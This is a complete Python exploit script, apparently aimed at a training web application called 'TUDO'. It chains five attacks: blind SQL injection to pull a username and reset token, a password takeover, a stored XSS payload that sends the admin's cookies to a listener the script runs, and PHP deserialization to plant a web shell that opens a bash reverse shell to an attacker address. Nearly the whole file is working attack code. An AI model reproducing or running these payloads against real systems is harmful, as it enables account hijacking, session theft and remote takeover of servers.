import requests
import sys
import random
import string
import socket

"""
[+] Import Libraries
[+] Define proxy settings if needed (e.g., for debugging)
[+] Initialize sessions for normal and admin users
[+] Perform SQL injection to retrieve character by character of the desired data
[+] Extract data using the SQL injection vulnerability
[+] Reset the password for a user
[+] Change the password for a user
[+] Attempt to login with provided credentials
[+] Send XSS payload to the profile page
[+] Start a server to capture cookies sent by the XSS payload
[+] PHP  deserialize vulnerability to gain RCE
"""

# proxies={"http":"127.0.0.1:8080"}



banner="""
████████╗██╗   ██╗██████╗  ██████╗ 
╚══██╔══╝██║   ██║██╔══██╗██╔═══██╗
   ██║   ██║   ██║██║  ██║██║   ██║
   ██║   ██║   ██║██║  ██║██║   ██║
   ██║   ╚██████╔╝██████╔╝╚██████╔╝
   ╚═╝    ╚═════╝ ╚═════╝  ╚═════╝ 
                                   
   @0x2nac0nda
"""

host='0.0.0.0'
svcport=80


sess=requests.Session()
adminsess=requests.Session()

def sql_injection(ip,inj_query):

    for i in range(32,126):
        data={"username":"%s"%(inj_query.replace("[CHAR]",str(i)))}
        req=requests.post("http://%s//forgotusername.php"%ip,data=data)
        if "User exists!" in str(req.text):
            return i
    return None


def extract_sensitive_data(ip,inject_query):
    extracted=""
    for j in range(1,60):
        inject="admin' and (select ascii(substring((%s),%d,1)))=[CHAR] --"%(inject_query,j)
        ret_value=sql_injection(ip,inject)
        if ret_value:
            extracted+=chr(ret_value)
            extract_chars=chr(ret_value)
            sys.stdout.write(extract_chars)
            sys.stdout.flush()
        else:
            #print("\nFinish\n")
            break
    return extracted


def reset_user_password(ip,username):
	data={"username":str(username)}
	req=requests.post("http://%s/forgotpassword.php"%ip,data=data)
	if "Email sent!" in req.text:
		print("\n[+] Reset token for %s"%username)

def change_user_password(ip,token,passowrd):
	data={"token":str(token),"password1":str(passowrd),"password2":str(passowrd)}
	req=requests.post("http://%s/resetpassword.php"%ip,data=data)
	if "Password changed!" in req.text:
		print("\n[+] Password changed to %s"%passowrd)

          
def login_as_user(ip,username,passowrd):
	data={"username":str(username),"password":str(passowrd)}
	login=sess.post("http://%s/login.php"%ip,data=data,allow_redirects=False)
	if login.status_code==302:
		print("[+] Login Success ")
		return True

def send_xss_payload(ip,lhost):
	data={"description":"<script>document.write('<img src=http://{}/'+document.cookie+' />');</script>".format(lhost)}
	login=sess.post("http://%s/profile.php"%ip,data=data)
	if "My Profile:" in login.text:
		print("[+] XSS payload send ..")
		return True

def start_xss_server(host,lport):
        #
        so = socket.socket()
        so.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        so.bind((host,lport))
        so.listen()

        print("[*] Server Running...")
        (handler, conn) = so.accept()
        data = handler.recv(4096)
        cookies=data.split(b"HTTP")[0][5:].decode("UTF-8")
        return cookies
# https://www.exploit-db.com/docs/english/44756-deserialization-vulnerability.pdf
def exploit_deserialization(ip,admincookie,filename,lhost,lport):
    full_path="/var/www/html/"+filename
    lpath=len(full_path)
    data="<?php exec(\"/bin/bash -c 'bash -i >& /dev/tcp/%s/%d 0>&1'\");?>"%(lhost,lport)
    ldata=len(data)
    serialize_payload='O:3:"Log":2:{s:1:"f";s:%d:\"%s\";s:1:"m";s:%d:\"%s\";}'%(lpath,full_path,ldata,data)
    adminsess.cookies.set("PHPSESSID",str(admincookie))
    param={"userobj":serialize_payload}
    req=adminsess.post("http://%s//admin/import_user.php"%ip,data=param,allow_redirects=False)
    if "index.php" in req.headers.get("Location"):
        #print("OK")
        return True

def Trigger_shell(ip,filename):
    print("[+] trigger serialized shell :) ")
    req=requests.get("http://%s/%s.php"%(ip,filename))

def main():
    if len(sys.argv) != 4:
        print(banner)
        print ("(+) usage: %s <target>   <LHOST>  <LPORT> "  % sys.argv[0])
        print ('(+) eg: %s 172.17.0.1 172.17.0.2 443'  % sys.argv[0])
        sys.exit(-1)

    ip=sys.argv[1]
    lhost=str(sys.argv[2])
    lport=int(sys.argv[3])


    print(banner)

    pwn = ''.join(random.choice(string.ascii_letters) for _ in range(5))
    password=''.join(random.choice(string.ascii_letters) for _ in range(8))

    print("[+] Extract Username")
    username=extract_sensitive_data(ip,"select username from users where uid=3")

    reset_user_password(ip,username)

    token=extract_sensitive_data(ip,"select token from tokens where uid=3 limit 1")
    change_user_password(ip,token,password)

    if login_as_user(ip,username,password):
        print ("[+] Login Success :)")
        send_xss_payload(ip,host)
    session=start_xss_server(host,svcport).split("=")[1]

    if exploit_deserialization(ip,session,'%s.php'%pwn,lhost,lport):
        print("[+] Send serialize payload ")
        Trigger_shell(ip,pwn)


if __name__ == "__main__":
    main()